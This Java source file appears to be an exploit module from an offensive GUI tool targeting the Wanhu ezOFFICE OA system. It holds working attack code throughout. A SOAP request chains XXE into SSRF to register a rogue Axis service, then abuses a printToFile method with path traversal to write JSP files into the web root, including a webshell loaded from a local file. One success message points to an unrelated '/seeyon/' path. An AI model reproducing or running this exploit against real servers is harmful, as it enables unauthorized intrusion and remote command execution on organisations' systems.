package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Methods;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class wanhu_axisGeneralweb_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
//        Platform.runLater(() -> {
//            textArea.appendText("\n 该利用条件文件上传无法解析");
//        });
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return false;
    }

    public String axisGeneralweb(String url, String filename,String fileContent) {
        //XXE > ssrf 注册service利用payload
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gen=\"http://com.whir.service/GeneralWeb\">\n" +
                "<soapenv:Header/>\n" +
                "<soapenv:Body>\n" +
                "<gen:OAManager>\n" +
                "<gen:input>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n" +
                "&lt;!DOCTYPE root [\n" +
                "&lt;!ENTITY x SYSTEM \"http://127.0.0.1:7001/defaultroot/services/AdminService;login.js?method=!--%3E%3Cdeployment%20xmlns=%22http://xml.apache.org/axis/wsdd/%22%20xmlns:java=%22http://xml.apache.org/axis/wsdd/providers/java%22%3E%3Cservice%20name=%22serviceded%22%20provider=%22java:RPC%22%3E%3Cparameter%20name=%22className%22%20value=%22com.whir.ezoffice.ezform.util.StringUtil%22%20/%3E%3Cparameter%20name=%22allowedMethods%22%20value=%22*%22%20/%3E%3C/service%3E%3C/deployment\"&gt;]&gt;\n" +
                "  &lt;root&gt;&amp;x;&lt;/root&gt;</gen:input>      </gen:OAManager>\n" +
                "</soapenv:Body>\n" +
                "</soapenv:Envelope>";

        //文件上传利用payload
        String fileuplod = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n" +
                "    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                "    xmlns:util=\"http://utility.template.freemarken\"\n" +
                "    xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">\n" +
                "    <soapenv:Header/>\n" +
                "    <soapenv:Body>\n" +
                "        <util:printToFile soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n" +
                "            <fileName xsi:type=\"soapenc:string\">../server/oa/deploy/defaultroot.war/public/edit/" + filename + "</fileName>\n" +
                "            <content xsi:type=\"soapenc:string\">" + fileContent + "</content>\n" +
                "        </util:printToFile>\n" +
                "    </soapenv:Body>\n" +
                "</soapenv:Envelope>";
        HashMap headers = new HashMap();
        headers.put("Content-Type", "text/xml;charset=UTF-8");

        HttpTools.post(url + "/defaultroot/xfservices/././././Generalweb;1.js", payload, headers, "UTF-8");

        Response response = HttpTools.get(url + "/defaultroot/services/serviceded;login.js", new HashMap<String, String>(), "UTF-8");
        if (response.getCode() == 200 && response.getText().contains("serviceded")) {
            headers.put("Content-Type", "text/xml;charset=UTF-8");
            headers.put("SOAPAction", "");

            HttpTools.post(url + "/defaultroot/services/serviceded;login.js", fileuplod, headers, "UTF-8");
            Response response1 = HttpTools.get(url + "/defaultroot/public/edit/" + filename, new HashMap<String, String>(), "UTF-8");
            if (response1.getCode() == 200) {
                return url + "/defaultroot/public/edit/" + filename;
            } else {
                return null;
            }
        } else {
            return null;
        }
    }

    private boolean att(String url, TextArea textArea) {
        long tt = (new Date()).getTime();
        String filename = tt + ".jsp";
        String shell = tt + "";
        String fullpath = axisGeneralweb(url, filename, shell);
        if (fullpath != null) {
            Platform.runLater(() -> {
                textArea.appendText("\n [ wanhu_axisGeneralweb_upload ]");
                textArea.appendText("\n 文件写入成功: " + fullpath + "\n " +
                        "访问成功: " + HttpTools.get(fullpath, new HashMap<>(), "utf-8").getText());
                textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                textArea.appendText("\n ");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n ");
            });
            return false;
        }
    }

    private boolean attcmd(String url ,String pass ,TextArea textArea,TextArea textArea_cmd){
        long tt = (new Date()).getTime();
        String filename= "R4g"+tt+".jsp";
        String shell = "R4g11"+tt+ Methods.readFile(pass);
        String fullpath = axisGeneralweb(url,filename,shell);
        if (fullpath!=null) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件写入成功\n " + url + "/seeyon/R4g11Test.jsp");


            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell写入失败");
            });
            return false;
        }
    }

}
